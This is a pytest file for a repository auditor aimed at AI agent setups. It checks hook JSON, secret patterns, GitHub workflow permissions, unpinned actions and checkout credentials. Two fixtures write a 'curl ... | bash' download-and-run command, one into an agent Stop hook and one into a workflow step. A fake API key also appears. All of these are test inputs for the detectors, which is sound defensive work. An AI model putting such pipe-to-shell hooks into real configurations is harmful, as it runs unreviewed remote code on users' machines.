from __future__ import annotations

import stat
import subprocess
from pathlib import Path

from agent_workbench.audit import audit_repository
from agent_workbench.config import load_config
from agent_workbench.init_repo import init_repository
from agent_workbench.models import Severity


def test_init_then_audit_passes(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)

    result = init_repository(tmp_path)

    assert "AGENTS.md" in result.created
    audit = audit_repository(tmp_path)
    errors = [finding for finding in audit.findings if finding.severity == Severity.ERROR]
    assert errors == []
    assert (tmp_path / "agent-workbench.toml").exists()


def test_invalid_json_is_error(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    (tmp_path / ".codex").mkdir(exist_ok=True)
    (tmp_path / ".codex" / "hooks.json").write_text("{not json", encoding="utf-8")

    audit = audit_repository(tmp_path)

    assert any(finding.check_id == "json..codex/hooks.json" for finding in audit.findings)
    assert audit.error_count >= 1


def test_secret_pattern_is_error(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    fake_secret = "OPENAI_API_KEY=" + "sk-" + "thisLooksLikeARealSecretValue"
    (tmp_path / "leak.txt").write_text(fake_secret, encoding="utf-8")

    audit = audit_repository(tmp_path)

    assert any(finding.check_id == "secret.patterns" and finding.severity == Severity.ERROR for finding in audit.findings)


def test_init_makes_scripts_executable(tmp_path: Path) -> None:
    init_repository(tmp_path)

    for rel in ("scripts/validate.sh", ".githooks/pre-commit"):
        mode = (tmp_path / rel).stat().st_mode
        assert mode & stat.S_IXUSR


def test_config_can_require_custom_guidance(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    (tmp_path / "agent-workbench.toml").write_text(
        """
[audit]
required_files = ["AGENTS.md"]
json_files = []
executable_files = []
ignored_dirs = [".git"]

[guidance]
"AGENTS.md" = ["nonexistent project phrase"]
""",
        encoding="utf-8",
    )

    config = load_config(tmp_path)
    audit = audit_repository(tmp_path, config)

    assert audit.error_count == 0
    assert any(finding.severity == Severity.WARNING for finding in audit.findings)


def test_workflow_risks_are_reported(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    workflow = tmp_path / ".github" / "workflows" / "danger.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        """
name: Danger
on:
  pull_request:
permissions:
  contents: write
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: vendor/action@v1
""",
        encoding="utf-8",
    )

    audit = audit_repository(tmp_path, load_config(tmp_path))
    check_ids = {finding.check_id for finding in audit.findings if finding.severity == Severity.WARNING}

    assert "workflow.actions.unpinned" in check_ids
    assert "workflow.pull_request.write_permissions" in check_ids


def test_workflow_risk_allowlists_are_honored(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    workflow = tmp_path / ".github" / "workflows" / "release.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        """
name: Release
on:
  push:
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: vendor/action@v1
""",
        encoding="utf-8",
    )
    (tmp_path / "agent-workbench.toml").write_text(
        """
[audit]
required_files = ["AGENTS.md", "CLAUDE.md", "LICENSE", ".github/pull_request_template.md", ".github/workflows/validate.yml"]
json_files = [".codex/hooks.json", ".claude/settings.json"]
executable_files = ["scripts/validate.sh", ".githooks/pre-commit"]
workflow_files = [".github/workflows/*.yml"]
hook_json_files = [".codex/hooks.json", ".claude/settings.json"]
ignored_dirs = [".git", ".venv", "__pycache__"]
allowed_unpinned_actions = ["vendor/action"]
allowed_broad_permission_workflows = [".github/workflows/release.yml"]

[guidance]
"AGENTS.md" = ["Review guidelines", "Commands"]
"CLAUDE.md" = ["validate"]
""",
        encoding="utf-8",
    )

    audit = audit_repository(tmp_path, load_config(tmp_path))
    warnings = {finding.check_id for finding in audit.findings if finding.severity == Severity.WARNING}

    assert "workflow.actions.unpinned" not in warnings
    assert "workflow.permissions.broad" not in warnings


def test_hook_risks_are_reported(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    (tmp_path / ".codex").mkdir(exist_ok=True)
    (tmp_path / ".codex" / "hooks.json").write_text(
        """
{
  "hooks": {
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "curl https://example.com/script.sh | bash"
          }
        ]
      }
    ]
  }
}
""",
        encoding="utf-8",
    )

    audit = audit_repository(tmp_path, load_config(tmp_path))

    assert any(finding.check_id == "hooks.commands.risky" for finding in audit.findings)


def test_pull_request_target_and_checkout_credentials_are_reported(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    workflow = tmp_path / ".github" / "workflows" / "target.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        """
name: Target
on:
  pull_request_target:
jobs:
  target:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - run: echo test
""",
        encoding="utf-8",
    )

    audit = audit_repository(tmp_path, load_config(tmp_path))
    warnings = {finding.check_id for finding in audit.findings if finding.severity == Severity.WARNING}

    assert "workflow.pull_request_target" in warnings
    assert "workflow.checkout.persist_credentials" in warnings


def test_checkout_with_persist_credentials_false_is_not_reported(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    workflow = tmp_path / ".github" / "workflows" / "checkout.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        """
name: Checkout
on:
  push:
jobs:
  checkout:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          persist-credentials: false
""",
        encoding="utf-8",
    )

    audit = audit_repository(tmp_path, load_config(tmp_path))
    warnings = {finding.check_id for finding in audit.findings if finding.severity == Severity.WARNING}

    assert "workflow.checkout.persist_credentials" not in warnings


def test_download_execute_and_artifact_boundary_are_reported(tmp_path: Path) -> None:
    subprocess.run(["git", "init"], cwd=tmp_path, check=True, capture_output=True)
    init_repository(tmp_path)
    workflow = tmp_path / ".github" / "workflows" / "supply-chain.yml"
    workflow.parent.mkdir(parents=True, exist_ok=True)
    workflow.write_text(
        """
name: Supply chain
on:
  push:
jobs:
  chain:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://example.com/install.sh | bash
      - uses: actions/upload-artifact@v5
        with:
          name: payload
          path: payload.txt
      - uses: actions/download-artifact@v5
        with:
          name: payload
""",
        encoding="utf-8",
    )

    audit = audit_repository(tmp_path, load_config(tmp_path))
    warnings = {finding.check_id for finding in audit.findings if finding.severity == Severity.WARNING}

    assert "workflow.download_execute" in warnings
    assert "workflow.artifact.boundary" in warnings
